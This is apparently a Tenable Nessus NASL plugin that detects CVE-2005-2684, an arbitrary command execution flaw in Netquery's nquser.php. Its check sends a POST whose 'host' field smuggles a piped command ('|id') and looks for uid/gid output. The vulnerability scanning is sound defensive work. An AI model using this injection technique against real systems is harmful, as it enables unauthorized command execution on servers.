#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(19503);
  script_version("1.20");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/07");

  script_cve_id("CVE-2005-2684");
  script_bugtraq_id(14637);

  script_name(english:"Netquery <= 3.11 nquser.php host Parameter Arbitrary Command Execution");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to an
arbitrary command execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote host is running Netquery, a suite of network information
utilities written in PHP. 

The installed version of Netquery lets an attacker execute arbitrary
commands within the context of the affected web server user id by
passing them through the 'host' parameter of the 'nquser.php' script.");
  script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/netquery311.html");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Netquery 3.2 or later, as that is rumored to address the
issue.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/08/23");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/08/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:virtech:netquery");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl", "postnuke_detect.nasl", "xaraya_detection.nasl", "xoops_detect.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("data_protection.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Generate a list of paths to check.
npaths = 0;
#
# - standalone version.
foreach dir (cgi_dirs()) {
  paths[npaths++] = string(dir, "/nquser.php");
}
# - Postnuke module.
install = get_kb_item(string("www/", port, "/postnuke"));
if (install) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    dir = matches[2];
    paths[npaths++] = string(dir, "/index.php?module=Netquery");
  }
}
# - Xaraya module.
install = get_kb_item(string("www/", port, "/xaraya"));
if (install) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    dir = matches[2];
    paths[npaths++] = string(dir, "/index.php?module=netquery");
  }
}
# - Xoops module.
install = get_kb_item(string("www/", port, "/xoops"));
if (install) {
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches)) {
    dir = matches[2];
    paths[npaths++] = string(dir, "/modules/netquery/index.php");
  }
}


# Loop through each path.
foreach path (paths) {
  # Check whether nquser.php exists.
  r = http_send_recv3(method:"GET", item:path, port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If it does and looks like Netquery w/ dig enabled...
  if (egrep(string:res, pattern:'<input name="b4" .*src=".+/btn_dig\\.gif"')) {
    # Try to exploit the flaw to run a command.
    postdata = string(
      "querytype=dig&",
      # nb: run 'id'.
      "host=|id&",
      "digparam=ANY"
    );
    r = http_send_recv3(method: "POST", item: path, port: port, 
      content_type:"application/x-www-form-urlencoded", data: postdata);
    if (isnull(r)) exit(0);
    res = r[2];

    pat = "<p>(uid=[0-9]+.*gid=[0-9]+.*)<br>";
    matches = egrep(string:res, pattern:pat);
    if (matches) {
      foreach match (split(matches)) {
        match = chomp(match);
        output = eregmatch(pattern:pat, string:match);
        if (!isnull(output)) {
          output = output[1];
          break;
        }
      }
    }
    if (output) {
      report = string(
        "Nessus was able to execute the command 'id' on the remote host.\n",
        "\n",
        "  Request:  POST ", path, "\n",
        "  Output:   ", data_protection::sanitize_uid(output:output), "\n"
      );
      security_hole(port:port, extra:report);
      exit(0);
    }
  }
}
